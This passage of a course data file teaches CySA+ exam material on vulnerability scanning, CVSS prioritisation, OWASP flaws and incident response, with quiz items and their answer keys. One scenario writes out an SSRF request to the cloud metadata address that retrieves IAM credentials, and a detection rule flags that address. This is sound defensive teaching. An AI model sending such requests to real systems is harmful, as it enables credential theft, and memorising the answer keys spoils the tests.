              heading: 'Validation Matrix: True/False Positives & Negatives',
              explanation:
                'Raw scanner output is never handed directly to system owners unvalidated. A True Positive is a real vulnerability accurately flagged. A False Positive is an erroneous alert (e.g., a Linux distro backported a security fix into OpenSSH 8.2, so banner-grabbing falsely flags it as vulnerable). A False Negative is the most dangerous error: a real flaw the scanner missed completely (often due to outdated plugins, uncredentialed scan limits, or firewalls dropping probes). Validation cross-checks banner versions against package changelogs, manual verification, and compensating controls.',
              mentalModel:
                'Fire alarm errors: False Positive = alarm rings when you burn toast (wastes team trust); False Negative = real fire burns the house while the smoke detector stays silent (catastrophic).',
            },
            {
              heading: 'Cloud, Container & Infrastructure-as-Code (IaC) Scanning',
              explanation:
                'Traditional IP-based scanners fail in elastic cloud environments where instances spin up and vanish in minutes. Modern vulnerability management layers three cloud-native checks: (1) IaC Scanning (Checkov, tfsec) catching public S3 buckets or overly broad IAM policies in Terraform/CloudFormation BEFORE deployment; (2) Container Image Scanning (Trivy, Grype) auditing base OS layers and packages in CI/CD registries before Kubernetes runtime; and (3) CSPM (Cloud Security Posture Management) continuously auditing live cloud API configurations for drift against CIS Benchmarks.',
              mentalModel:
                'Catch flaws at the blueprint (IaC), the factory assembly line (Container Registry), and on the highway (CSPM runtime).',
            },
          ],
          realWorldScenario: {
            title: 'The Backported RHEL OpenSSL False Positive',
            situation:
              'An external uncredentialed scan flags a high-volume e-commerce Linux server with a Critical OpenSSL CVE based on its TLS banner string. The Linux engineering team insists the server is fully patched and refuses an emergency reboot during Black Friday week.',
            analysis:
              'Enterprise Linux distributions (RHEL, Ubuntu LTS) routinely backport security patches into older package version strings without changing the major version banner. Running a credentialed scan (or verifying `rpm -q --changelog openssl` for the exact CVE ID) confirms whether the fix is genuinely present—proving a False Positive without causing an unnecessary peak-season outage.',
            takeaway:
              'Always confirm banner-based uncredentialed findings with credentialed checks or package changelog evidence before triggering emergency change freezes.',
          },
          examTraps: [
            'Trap: Running an active credentialed vulnerability scan against industrial PLC/SCADA controllers. Legacy OT devices can freeze or crash—choose passive monitoring.',
            'Trap: Confusing False Negative (real flaw missed by scanner—most dangerous!) with False Positive (clean system wrongly flagged).',
            'Trap: Scanning only during a Sunday 2 AM network window when 60% of corporate laptops are powered off at home. Use Agent-Based scanning for remote/roaming endpoints.',
          ],
          keyTerms: [
            {
              term: 'Credentialed Scan',
              definition:
                'Authenticated vulnerability assessment inspecting local patches, registry keys, and software inventories for minimal false positives/negatives.',
            },
            {
              term: 'False Negative',
              definition:
                'A real vulnerability present on a target system that a scanner failed to detect—the highest-risk scanning error.',
            },
            {
              term: 'CSPM (Cloud Security Posture Management)',
              definition:
                'Continuous cloud API monitoring that detects misconfigurations, IAM over-privilege, public storage exposure, and compliance drift.',
            },
            {
              term: 'SCAP (Security Content Automation Protocol)',
              definition:
                'NIST suite of open standards (CVE, CVSS, CPE, CCE, OVAL, XCCDF) enabling automated vulnerability and configuration compliance checking.',
            },
          ],
          conceptChecks: [
            {
              id: 'cysa-d2-l1-q1',
              question:
                'A manufacturing plant wants vulnerability visibility across 80 legacy programmable logic controllers (PLCs) controlling assembly-line robotics that cannot tolerate unexpected packets or reboots. Which discovery method should the analyst recommend?',
              options: [
                'Aggressive Nmap `-A -T5` active scan during peak production',
                'Passive network vulnerability monitoring via SPAN/TAP traffic mirroring',
                'Automated exploitation validation using Metasploit',
                'Installing desktop EDR agents directly onto the PLCs',
              ],
              correctIndex: 1,
              rationale:
                'Passive scanning inspects mirrored network traffic without sending probes to fragile OT/ICS devices, preventing safety incidents or production halts.',
            },
            {
              id: 'cysa-d2-l1-q2',
              question:
                'A remote-first company runs weekly Sunday-night network vulnerability scans from headquarters, yet post-breach forensics shows an employee laptop missed 6 months of critical browser patches. What is the BEST architectural fix?',
              options: [
                'Increase the network scanner thread count on Sunday nights',
                'Deploy lightweight agent-based vulnerability scanning that reports whenever endpoints come online',
                'Switch exclusively to external perimeter scanning',
                'Disable browser auto-updates to stabilize baselines',
              ],
              correctIndex: 1,
              rationale:
                'Agent-based scanners continuously assess roaming/remote endpoints independent of VPN presence or fixed network scan windows.',
            },
          ],
          practicalDrill: {
            title: 'Design a Hybrid Enterprise Scanning Strategy',
            prompt:
              'Select the right scan type, cadence, and credentials for four distinct environments: Public DMZ, Remote Employee Laptops, AWS EKS Kubernetes Cluster, and Factory OT Network.',
            steps: [
              'Assign Scan Method (External Uncredentialed, Internal Credentialed, Agent-Based, Passive, IaC/Container/CSPM) to each of the four zones.',
              'Specify scan frequency and maintenance window constraints for each zone.',
              'Define a 3-step validation workflow for handling an engineer’s "False Positive" dispute.',
              'Note one SCAP component (CVE, CPE, OVAL, or CVSS) utilized in reporting.',
            ],
            successCriteria:
              'Zero active intrusive scans on OT, agents assigned to roaming laptops, shift-left container/CSPM scanning for EKS, and evidence-backed false-positive validation.',
          },
          flashcards: [
            {
              front: 'Why are False Negatives more dangerous than False Positives in vulnerability management?',
              back: 'A False Negative leaves a real exploitable flaw completely invisible to defenders, whereas a False Positive causes investigation noise without leaving an undetected gap.',
              tag: 'CYSA-D2',
            },
            {
              front: 'Name the core NIST SCAP standards and what CVE, CPE, and OVAL identify.',
              back: 'CVE = unique vulnerability ID; CPE = standardized software/hardware platform naming; OVAL = standardized language to check system state for vulnerabilities/configs.',
              tag: 'CYSA-D2',
            },
          ],
          sourceRefs: [
            'my_documents/Chapple M. CompTIA CySA+ Practice Tests. Exam CS0-003 3ed 2023.pdf',
          ],
        },
        {
          id: 'cysa-d2-l2',
          title: 'Vulnerability Prioritization Science: CVSS v3.1, EPSS, CISA KEV & Asset Context',
          estimatedMinutes: 50,
          summary:
            'Decode CVSS v3.1 base vector strings effortlessly on the exam and combine technical severity (CVSS) with exploit probability (EPSS), active exploitation status (CISA KEV), exposure, and business criticality.',
          learningObjectives: [
            'Decode every metric inside a CVSS v3.1 vector string (`AV`, `AC`, `PR`, `UI`, `S`, `C`, `I`, `A`) to compare two vulnerabilities instantaneously.',
            'Explain why prioritizing strictly by CVSS Base Score fails and how EPSS, CISA KEV, SSVC, and asset exposure transform remediation speed.',
            'Select appropriate risk treatments when immediate patching is impossible (virtual patching/WAF, network segmentation, disabling vulnerable features).',
          ],
          coreConcepts: [
            {
              heading: 'Decoding CVSS v3.1 Vector Strings (High-Yield CS0-003 Exam Skill!)',
              explanation:
                'CySA+ CS0-003 LOVES showing two or four CVSS v3.1 vector strings and asking which vulnerability requires immediate patching first. Master all 8 Base Metrics:\n• Attack Vector (AV): N (Network—worst, remotely exploitable!) > A (Adjacent) > L (Local) > P (Physical).\n• Attack Complexity (AC): L (Low—easy/repeatable, worst!) > H (High).\n• Privileges Required (PR): N (None—unauthenticated, worst!) > L (Low) > H (High).\n• User Interaction (UI): N (None—zero-click wormable, worst!) > R (Required).\n• Scope (S): C (Changed—breaks out of sandbox/VM/component to impact other resources, worst!) > U (Unchanged).\n• Impact Triad (C, I, A): H (High) > L (Low) > N (None).',
              mentalModel:
                'The Ultimate Nightmare Vector = `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (Score 10.0: Remote over internet, easy, no login needed, zero clicks, escapes sandbox, total C/I/A compromise!).',
              formulaOrRule:
                'Worst-Case Exploitability Combo: AV:N + AC:L + PR:N + UI:N (Remote, Easy, Unauthenticated, Zero-Click).',
            },
            {
              heading: 'Beyond CVSS: EPSS, CISA KEV & Contextual Prioritization',
              explanation:
                'Over 50% of published CVEs carry High or Critical CVSS base scores, yet fewer than 5% are ever weaponized in the wild. CVSS Base measures technical severity in a vacuum—NOT likelihood of exploitation or business value. Risk-Based Vulnerability Management overlays three vital signals: (1) CISA KEV (Known Exploited Vulnerabilities catalog—proof attackers are actively exploiting the flaw right now); (2) EPSS (Exploit Prediction Scoring System—ML probability from 0% to 100% that a CVE will be exploited in the next 30 days); and (3) Environmental Context (internet-facing vs. air-gapped, Tier-0 Crown Jewel vs. isolated test lab, compensating controls in place).',
              mentalModel:
                'CVSS tells you how deadly the snake’s venom is; EPSS/KEV tells you whether that snake is actually slithering inside your living room right now!',
              formulaOrRule:
                'Priority #1 = Internet-Facing Critical Asset + Active Exploitation (CISA KEV / High EPSS) + AV:N/PR:N/UI:N.',
            },
            {
              heading: 'Compensating Controls & Virtual Patching Under Change Freezes',
              explanation:
                'Sometimes an organization cannot patch immediately (vendor patch unavailable for a zero-day, legacy app regression risk, or holiday revenue freeze). Analysts never leave the flaw exposed—they deploy compensating mitigations: Virtual Patching via WAF/IPS rules blocking the exploit signature, network microsegmentation/ACLs restricting port access to trusted management IPs, disabling the vulnerable module/feature, or tightening EDR behavioral blocking until the maintenance patch window opens.',
              mentalModel:
                'Emergency plumbing: If the replacement pipe takes 48 hours to ship, shut off the branch valve and clamp the leak (virtual patch/ACL) immediately instead of letting the basement flood.',
            },
          ],
          realWorldScenario: {
            title: 'Choosing Between Four Simultaneous Critical CVEs',
            situation:
              'Monday morning brings four vulnerabilities: (A) CVSS 9.8 (`AV:N/AC:L/PR:N/UI:N`) on an internet-facing VPN gateway listed on CISA KEV with EPSS 94%; (B) CVSS 9.9 (`AV:L/AC:L/PR:H/UI:N`) on an offline QA database; (C) CVSS 8.8 (`AV:N/AC:L/PR:L/UI:R`) on an internal wiki behind SSO; (D) CVSS 9.1 (`AV:P/AC:L/PR:N/UI:N`) requiring physical USB access inside a locked data center.',
            analysis:
              'Vulnerability A MUST be patched FIRST despite B having a 0.1 higher CVSS base score. Why? A is internet-facing, remotely exploitable with zero credentials and zero user interaction (`AV:N/PR:N/UI:N`), AND actively exploited in the wild (KEV + 94% EPSS). B requires local high-privileged access on a non-production offline box; D requires physical access.',
            takeaway:
              'On CySA+, an internet-facing `AV:N/PR:N/UI:N` flaw with active exploitation ALWAYS beats a slightly higher CVSS score on an isolated or local/physical-only asset.',
          },
          examTraps: [
            'Trap: Automatically picking the single highest numeric CVSS score without reading `AV` (Network vs Local/Physical), `PR` (None vs High), `UI` (None vs Required), or asset exposure!',
            'Trap: Confusing `S:C` (Scope Changed—impact crosses security boundaries like VM escape or XSS executing in victim browser) with `S:U` (Scope Unchanged).',
            'Trap: Forgetting that CVSS Base scores are static, whereas Temporal/Threat metrics (exploit maturity) and Environmental metrics (asset criticality) adjust risk to YOUR organization.',
          ],
          keyTerms: [
            {
              term: 'CVSS v3.1 Vector String',
              definition:
                'Compact notation encoding a vulnerability’s exploitability (`AV/AC/PR/UI/S`) and impact (`C/I/A`) metrics on a 0.0–10.0 severity scale.',
            },
            {
              term: 'EPSS (Exploit Prediction Scoring System)',
              definition:
                'Data-driven probability score (0–100%) estimating the likelihood that a specific CVE will be exploited in the wild within the next 30 days.',
            },
            {
              term: 'CISA KEV Catalog',
              definition:
                'Authoritative list of Known Exploited Vulnerabilities actively leveraged by threat actors, warranting urgent prioritized remediation.',
            },
            {
              term: 'Virtual Patching',
              definition:
                'Deploying an external compensating rule (WAF, IPS, RASP) to block exploit payloads targeting a flaw before the underlying software patch can be installed.',
            },
          ],
          conceptChecks: [
            {
              id: 'cysa-d2-l2-q1',
              question:
                'Which CVSS v3.1 vector represents a remotely exploitable vulnerability requiring NO authentication, NO user interaction, and breaking out of the vulnerable security boundary?',
              options: [
                'CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
                'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
                'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H',
                'CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H',
              ],
              correctIndex: 1,
              rationale:
                '`AV:N` = Network (remote), `PR:N` = Privileges Required None (no auth), `UI:N` = User Interaction None, and `S:C` = Scope Changed (breaks out of vulnerable component boundary).',
            },
            {
              id: 'cysa-d2-l2-q2',
              question:
                'A critical zero-day SQL injection flaw is disclosed in a customer-facing payment portal, and the vendor will not release an official patch for 10 days. Taking the portal offline would bankrupt the firm. What is the BEST immediate compensating control?',
              options: [
                'Accept the risk and wait 10 days for the vendor patch',
                'Deploy a targeted WAF virtual patching rule blocking the exploit pattern combined with heightened SIEM/database alerting',
                'Disable HTTPS to inspect payloads in plaintext at the ISP',
                'Switch the database to an uncredentialed weekly scan',
              ],
              correctIndex: 1,
              rationale:
                'Virtual patching via WAF plus enhanced monitoring immediately mitigates exploitation risk without causing a catastrophic business outage while awaiting the vendor patch.',
            },
          ],
          practicalDrill: {
            title: 'CVSS Vector Speed-Decoding & Prioritization Triage',
            prompt:
              'Rank four realistic backlog CVEs into a 1-to-4 remediation order and justify each decision in one sentence.',
            steps: [
              'Decode `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (CVSS 9.8, Public API, EPSS 88%, KEV=Yes).',
              'Decode `AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:H` (CVSS 6.3, Isolated Staging VM, EPSS 0.2%, KEV=No).',
              'Decode `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` (CVSS 9.6, Internal HR App behind SSO+MFA, EPSS 14%, KEV=No).',
              'Decode `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` (CVSS 6.1, Public Marketing Site XSS, EPSS 42%, KEV=No) and propose a temporary mitigation for item #1 if patching takes 48 hours.',
            ],
            successCriteria:
              'Accurate plain-English decoding of every metric and clear risk-based ranking incorporating internet exposure, KEV, EPSS, and mitigating controls.',
          },
          flashcards: [
            {
              front: 'What do the CVSS v3.1 metrics `AV:N/AC:L/PR:N/UI:N/S:C` mean?',
              back: 'Attack Vector: Network, Attack Complexity: Low, Privileges Required: None, User Interaction: None, Scope: Changed.',
              tag: 'CYSA-D2',
            },
            {
              front: 'How do CVSS, EPSS, and CISA KEV complement each other?',
              back: 'CVSS measures technical severity; EPSS predicts 30-day exploitation probability; CISA KEV confirms active real-world exploitation.',
              tag: 'CYSA-D2',
            },
          ],
          sourceRefs: [
            'my_documents/Chapple M. CompTIA CySA+ Practice Tests. Exam CS0-003 3ed 2023.pdf',
          ],
        },
        {
          id: 'cysa-d2-l3',
          title: 'Application Security, OWASP Top 10, DevSecOps & Software Supply Chain (SBOM)',
          estimatedMinutes: 45,
          summary:
            'Recognize and remediate high-frequency OWASP code flaws (SQLi, XSS, CSRF, SSRF, IDOR/BOLA, Insecure Deserialization), choose the right AppSec testing tools (SAST, DAST, SCA, IAST), and secure CI/CD supply chains with SBOMs.',
          learningObjectives: [
            'Diagnose OWASP vulnerabilities from code snippets and HTTP traces and prescribe the exact root-cause code remediation.',
            'Differentiate SAST, DAST, SCA, IAST, and Fuzzing and position each correctly inside a DevSecOps CI/CD pipeline.',
            'Explain how Software Bill of Materials (SBOM—CycloneDX/SPDX) accelerates zero-day supply-chain response (e.g., Log4j).',
          ],
          coreConcepts: [
            {
              heading: 'OWASP Vulnerability-to-Root-Cause Fix Matrix',
              explanation:
                'CySA+ expects analysts to look at a broken code line or HTTP payload and name the exact root-cause fix:\n• SQL Injection (SQLi): Fix with Parameterized Queries / Prepared Statements (separating code from data) + least-privilege DB accounts.\n• Cross-Site Scripting (XSS — Reflected, Stored, DOM): Fix with Context-Aware Output Encoding + Content Security Policy (CSP) + `HttpOnly` cookies.\n• Cross-Site Request Forgery (CSRF): Fix with Anti-CSRF Synchronizer Tokens + `SameSite=Strict/Lax` cookie attributes.\n• Broken Object Level Authorization (BOLA / IDOR — e.g., changing `/api/invoice/1042` to `/1043` reads another customer’s bill): Fix with Server-Side Object-Level Authorization checks on every request.\n• Server-Side Request Forgery (SSRF — tricking server into calling `http://169.254.169.254/latest/meta-data/` to steal AWS IAM credentials): Fix with Strict Egress Allowlists + IMDSv2 (session tokens).',
              mentalModel:
                'Every web flaw has a signature partner fix: SQLi -> Parameterized Queries; XSS -> Output Encoding + CSP; CSRF -> Anti-CSRF Token + SameSite; IDOR -> Server-Side AuthZ; SSRF -> Allowlist + IMDSv2.',
              formulaOrRule:
                'Cloud SSRF Red Flag: Any HTTP request parameter fetching `169.254.169.254` = Cloud Metadata Credential Theft attempt!',
            },
            {
              heading: 'Shift-Left Testing: SAST vs. DAST vs. SCA vs. IAST',
              explanation:
                'Embedding security into CI/CD pipelines requires complementary analyzers:\n• SAST (Static Application Security Testing): White-box analysis of source code/bytecode before execution—catches hardcoded secrets and taint-flow SQLi early, but cannot see runtime configuration flaws.\n• DAST (Dynamic Application Security Testing): Black-box probing of a running application over HTTP—catches auth/session, header, and runtime flaws, but misses unreachable code paths.\n• SCA (Software Composition Analysis): Audits open-source dependencies (`package.json`, `pom.xml`, `requirements.txt`) against CVE databases and license risks—generating an SBOM (CycloneDX or SPDX).\n• IAST (Interactive AST): Instruments the running app from inside during QA tests for low false positives.',
              mentalModel:
                'Restaurant inspection: SAST reads the written recipe; SCA checks if the imported spinach has an FDA recall (SBOM); DAST taste-tests the served dish from the dining room.',
              formulaOrRule:
                'SAST = Static Source (White-Box) | DAST = Running App (Black-Box) | SCA = Third-Party Libraries & SBOM.',
            },
          ],
          realWorldScenario: {
            title: 'Stopping an AWS Cloud Takeover via SSRF',
            situation:
              'A web app includes a "Fetch Avatar from URL" endpoint: `POST /api/avatar {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-web-role"}`. Logs show HTTP 200 and 1,420 bytes returned to an external attacker.',
            analysis:
              'The attacker exploited Server-Side Request Forgery (SSRF) against AWS IMDSv1 (Instance Metadata Service v1) to steal temporary EC2 IAM role credentials straight out of the server. Immediate containment: revoke the compromised IAM role sessions, enforce IMDSv2 (which requires a PUT request with a custom header that simple SSRF cannot forge), and patch the avatar fetcher to validate URLs against a strict external domain allowlist blocking RFC1918 and link-local `169.254.0.0/16` ranges.',
            takeaway:
              'Recognizing `169.254.169.254` in web logs is an instant high-yield CySA+ cloud-security win.',
          },
          examTraps: [
            'Trap: Recommending "input blacklisting/stripping single quotes" to fix SQL Injection. Attackers easily bypass blocklists via encoding; Parameterized Queries / Prepared Statements are ALWAYS the definitive fix.',
            'Trap: Choosing SAST to discover vulnerable third-party open-source packages (like Log4j). Use SCA (Software Composition Analysis) and SBOMs to track third-party library CVEs.',
            'Trap: Confusing Stored XSS (payload saved in DB and served to other users) with CSRF (forged state-changing request leveraging a victim’s authenticated browser cookies).',
          ],
          keyTerms: [
            {
              term: 'Parameterized Query',
              definition:
                'Prepared database statement that binds user input strictly as data values rather than executable SQL syntax, neutralizing SQL injection.',
            },
            {
              term: 'SSRF (Server-Side Request Forgery)',
              definition:
                'Vulnerability allowing an attacker to coerce a server into making unintended HTTP/network requests to internal services or cloud metadata endpoints.',
            },
            {
              term: 'SCA (Software Composition Analysis)',
              definition:
                'Automated scanning of open-source and third-party software dependencies for known CVEs, malicious packages, and license compliance.',
            },
            {
              term: 'SBOM (Software Bill of Materials)',
              definition:
                'Machine-readable inventory (CycloneDX or SPDX) listing every direct and transitive library component inside a software build.',
            },
          ],
          conceptChecks: [
            {
              id: 'cysa-d2-l3-q1',
              question:
                'A DevSecOps engineer wants an automated CI/CD gate that inspects `package-lock.json` and `requirements.txt` for vulnerable open-source dependencies and generates a CycloneDX SBOM on every pull request. Which tool class should be integrated?',
              options: [
                'DAST (Dynamic Application Security Testing)',
                'SCA (Software Composition Analysis)',
                'Network Packet Broker',
                'Honeypot deception grid',
              ],
              correctIndex: 1,
              rationale:
                'SCA specializes in inspecting third-party/open-source dependency manifests for known CVEs and producing CycloneDX/SPDX SBOMs.',
            },
            {
              id: 'cysa-d2-l3-q2',
              question:
                'An authenticated user notices that changing `GET /api/orders/8812` to `GET /api/orders/8813` displays another customer’s shipping address and credit card last-4 digits. What vulnerability is present and what is the proper fix?',
              options: [
                'Buffer Overflow; enable ASLR and DEP',
                'Broken Object Level Authorization (IDOR/BOLA); enforce server-side ownership checks comparing the requested order’s owner against the authenticated session user',
                'Reflected XSS; add an anti-CSRF token',
                'Clickjacking; add X-Frame-Options: DENY',
              ],
              correctIndex: 1,
              rationale:
                'Accessing another user’s record simply by modifying an object identifier in the URL/API is IDOR/BOLA. Only server-side authorization verifying record ownership prevents it (random UUIDs alone are obscurity, not authorization).',
            },
          ],
          practicalDrill: {
            title: 'CI/CD Pipeline Security Gate Blueprint',
            prompt:
              'Map where SAST, SCA/SBOM, Secret Scanning, DAST, and Container Scanning run across Commit -> Build -> Staging -> Production.',
            steps: [
              'Assign Pre-Commit/PR checks (Secret Scanning + SAST + SCA) and define what breaks the build (e.g., hardcoded API key or KEV-listed library).',
              'Assign Build-stage artifact checks (Container Image Scan + signed SBOM emission).',
              'Assign Staging checks (DAST + API authZ testing for BOLA/SSRF).',
              'Define how the stored SBOM lets your SOC answer "Are we exposed to a brand-new library zero-day?" in under 5 minutes.',
            ],
            successCriteria:
              'Each tool sits at its exact SDLC stage with clear fail-the-build thresholds and SBOM incident-lookup workflow.',
          },
          flashcards: [
            {
              front: 'What is the definitive code-level fix for SQL Injection?',
              back: 'Parameterized Queries (Prepared Statements), which strictly separate SQL query structure from untrusted user input.',
              tag: 'CYSA-D2',
            },
            {
              front: 'What IP address in a web log signals an AWS/Cloud SSRF metadata credential-theft attempt?',
              back: '`169.254.169.254` (Cloud Instance Metadata Service—mitigated by enforcing IMDSv2 and egress URL allowlists).',
              tag: 'CYSA-D2',
            },
            {
              front: 'Differentiate SAST, DAST, and SCA.',
              back: 'SAST = white-box source code scan; DAST = black-box scan of a running app; SCA = third-party/open-source dependency & SBOM scan.',
              tag: 'CYSA-D2',
            },
          ],
          sourceRefs: [
            'my_documents/Chapple M. CompTIA CySA+ Practice Tests. Exam CS0-003 3ed 2023.pdf',
          ],
        },
      ],
    },

    // =================================================================
    // DOMAIN 3: Incident Response and Management (20%)
    // =================================================================
    {
      id: 'cysa-d3',
      domainNumber: 3,
      title: 'Incident Response and Management',
      examWeightPercent: 20,
      overview:
        'Executes the NIST SP 800-61 incident response lifecycle with surgical precision—containment strategy, eradication vs. recovery, digital forensics Order of Volatility, chain of custody, and blameless root-cause lessons learned.',
      lessons: [
        {
          id: 'cysa-d3-l1',
          title: 'NIST SP 800-61 Incident Response Lifecycle, Containment & Eradication',
          estimatedMinutes: 45,
          summary:
            'Master every decision transition in the NIST SP 800-61 lifecycle—Preparation, Detection & Analysis, Containment/Eradication/Recovery, and Post-Incident Activity—so you never pick a premature reboot or incomplete cleanup on exam day.',
          learningObjectives: [
            'Sequence NIST SP 800-61 phases and match specific SOC actions to Preparation, Detection & Analysis, Containment, Eradication, Recovery, and Post-Incident Activity.',
            'Choose optimal Containment strategies (network isolation/quarantine, segmentation, sinkholing, account revocation) without alerting adversaries prematurely or destroying volatile RAM.',
            'Execute full Eradication (removing persistence, rotating Kerberos KRBTGT twice, patching initial access) before controlled Recovery.',
            'Conduct blameless Post-Incident Lessons Learned sessions that directly update playbooks, SIEM rules, and tabletop exercises.',
          ],
          coreConcepts: [
            {
              heading: 'NIST SP 800-61 4-Phase IR Lifecycle',
              explanation:
                'NIST SP 800-61 organizes incident response into four core phases (with Phase 3 looping tightly across three sub-steps):\n1. Preparation: CSIRT charter, jump bags, out-of-band comms, forensic tooling, immutable backups, playbooks, tabletop exercises.\n2. Detection & Analysis: Triage alerts, validate real incident vs. false positive, determine scope/severity, declare incident, begin incident log.\n3. Containment, Eradication & Recovery:\n   • Containment (Short-term: EDR host isolation/VLAN quarantine to stop bleeding; Long-term: patching/rebuilding temporary clean systems while preserving evidence).\n   • Eradication: Eliminate root cause—delete malware, strip persistence (Scheduled Tasks, WMI, rogue accounts), patch exploited entry point, rotate compromised credentials (including double KRBTGT reset after Active Directory Golden Ticket compromise!).\n   • Recovery: Rebuild from known-good golden images, restore clean verified backups, monitor heavily for adversary re-entry.\n4. Post-Incident Activity: Blameless Lessons Learned meeting (typically within 1–2 weeks), Root Cause Analysis (RCA), executive report, and updating controls/detections.',
              mentalModel:
                'Emergency surgery: Prep (stock the ER) -> Detect/Analyze (diagnose bleeding) -> Contain (apply tourniquet—do NOT pull the plug yet!) -> Eradicate (remove the infection completely) -> Recover (stitch & monitor vitals) -> Post-Incident (update medical protocol).',
              formulaOrRule:
                'Golden IR Rule: NEVER wipe or power off an actively compromised host before deciding whether volatile memory capture is needed, and NEVER recover before full eradication!',
            },
            {
              heading: 'Smart Containment: Isolation vs. Tipping Off the Adversary',
              explanation:
                'A junior analyst sees one infected laptop and immediately blocks one IP or reboots the PC—alerting an APT operator who is already on 14 other servers to trigger ransomware immediately ("whack-a-mole containment"). Mature IR scopes the blast radius across Active Directory, EDR, and proxy logs FIRST, then executes coordinated simultaneous containment (isolating all compromised endpoints via EDR, revoking tokens/sessions, blocking C2 domains/sinkholing, and moving communication to out-of-band encrypted channels if corporate email/Slack is compromised).',
              mentalModel:
                'Law enforcement raid: Map every exit door before knocking on the front door; otherwise the suspect escapes through the back alley and burns the evidence.',
            },
          ],
          realWorldScenario: {
            title: 'The Recurring Ransomware Re-Infection',
            situation:
              'After a ransomware hit on 25 servers, IT immediately restores all servers from last night’s backups and brings the network back online within 6 hours. Thirty-six hours later, the exact same ransomware re-encrypts the entire network.',
            analysis:
              'IT skipped Eradication and Root Cause Analysis! The initial entry point (an unpatched internet-facing VPN appliance) was never patched, AND the attacker’s rogue domain admin account + backup-restored web shell remained active inside the restored image. Restoring backups without closing the initial entry vector and purging persistence guarantees re-compromise.',
            takeaway:
              'Recovery without complete Eradication (patching entry vector + purging persistence + rotating credentials) is just rebuilding a house while the arsonist is still standing inside.',
          },
          examTraps: [
            'Trap: Choosing "Immediately power off / unplug the compromised server" when forensic investigation or legal prosecution is required. Powering off wipes volatile RAM (encryption keys, fileless malware, active network sockets). Use EDR network isolation or unplug the network cable instead!',
            'Trap: Using corporate email or Microsoft Teams to coordinate an Active Directory / Microsoft 365 compromise. Always switch to Out-of-Band (OOB) communications so the adversary cannot read your IR plan.',
            'Trap: Resetting the Active Directory KRBTGT password only ONCE after a domain compromise. You MUST reset KRBTGT TWICE (waiting for replication, typically >=10 hours apart) because Active Directory keeps the current and previous password hashes valid.',
          ],
          keyTerms: [
            {
              term: 'Out-of-Band (OOB) Communications',
              definition:
                'Independent, encrypted communication channel (e.g., separate mobile messaging/phone bridge) used during IR so adversaries inside corporate email/chat cannot spy on response actions.',
            },
            {
              term: 'Containment vs. Eradication',
              definition:
                'Containment halts ongoing damage and lateral spread; Eradication removes root cause, malware, persistence mechanisms, and compromised credentials.',
            },
            {
              term: 'DNS Sinkholing',
              definition:
                'Containment and detection technique redirecting queries for known malicious C2 domains to an internal controlled IP to cut off attacker control and identify infected hosts.',
            },
            {
              term: 'Tabletop Exercise',
              definition:
                'Discussion-based Preparation drill walking technical and executive stakeholders through simulated incident scenarios to expose playbook gaps before a real crisis.',
            },
          ],
          conceptChecks: [
            {
              id: 'cysa-d3-l1-q1',
              question:
                'An analyst confirms an active fileless memory-resident beacon running on a finance server and legal counsel advises potential law enforcement prosecution. What is the BEST immediate containment action?',
              options: [
                'Pull the server’s power cord immediately to stop the process',
                'Reformat the hard drive and reinstall the operating system immediately',
                'Isolate the host from the network (via EDR containment or disconnecting network cable) while keeping it powered on to capture volatile memory',
                'Email the full forensic plan to all IT staff via the potentially compromised corporate Exchange server',
              ],
              correctIndex: 2,
              rationale:
                'Network isolation stops C2 communication and lateral spread immediately while preserving volatile RAM needed to capture fileless malware, active sockets, and decryption keys.',
            },
            {
              id: 'cysa-d3-l1-q2',
              question:
                'Forensics confirms an attacker compromised Active Directory and forged Kerberos Golden Tickets. During Eradication, what specific credential action is mandatory?',
              options: [
                'Reset only the local Administrator password on affected workstations',
                'Reset the `krbtgt` account password TWICE (separated by replication interval) to invalidate both current and prior Ticket Granting Ticket hashes',
                'Disable Kerberos permanently and switch to NTLMv1',
                'Clear browser cookies on the Domain Controller',
              ],
              correctIndex: 1,
              rationale:
                'Active Directory accepts both the current and immediately preceding `krbtgt` hash. Resetting it twice (after full AD replication between resets) invalidates all forged Golden Tickets.',
            },
          ],
          practicalDrill: {
            title: 'Ransomware Containment-to-Recovery Decision Matrix',
            prompt:
              'Sequence an emergency response plan when EDR flags simultaneous encryption on 4 file servers at 2:15 AM.',
            steps: [
              'List your first 3 Detection & Containment actions in exact priority order (including OOB comms activation).',
              'Specify 4 mandatory Eradication checks before any server is reconnected to production.',
              'Define how you validate clean backups before Recovery (preventing re-infection from dormant malware inside backups).',
              'Write 3 specific Post-Incident Lessons Learned improvements (1 technical, 1 process, 1 training).',
            ],
            successCriteria:
              'Preserves evidence, prevents re-infection by mandating root-cause eradication before restore, and uses out-of-band communication.',
          },
          flashcards: [
            {
              front: 'List the 4 main phases of the NIST SP 800-61 Incident Response Lifecycle.',
              back: '1. Preparation, 2. Detection & Analysis, 3. Containment, Eradication & Recovery, 4. Post-Incident Activity.',
              tag: 'CYSA-D3',
            },
            {
              front: 'Why should you isolate a compromised host’s network instead of pulling its power plug when forensics is required?',
              back: 'Pulling power destroys volatile RAM (fileless malware, active C2 connections, encryption keys); network isolation stops spread while preserving volatile evidence.',
              tag: 'CYSA-D3',
            },
          ],
          sourceRefs: [
            'my_documents/Chapple M. CompTIA CySA+ Practice Tests. Exam CS0-003 3ed 2023.pdf',
            'my_documents/cybersecurity-incident-management-guide-EN.pdf',
          ],
        },
        {
          id: 'cysa-d3-l2',
          title: 'Digital Forensics, Order of Volatility, Chain of Custody & Root Cause Analysis',
          estimatedMinutes: 45,
          summary:
            'Preserve court-admissible digital evidence following RFC 3227 Order of Volatility, hardware write-blockers, cryptographic hashing, strict Chain of Custody, and structured Root Cause Analysis (5 Whys / Fishbone).',
          learningObjectives: [
            'Acquire forensic artifacts strictly in RFC 3227 Order of Volatility (most volatile to least volatile).',
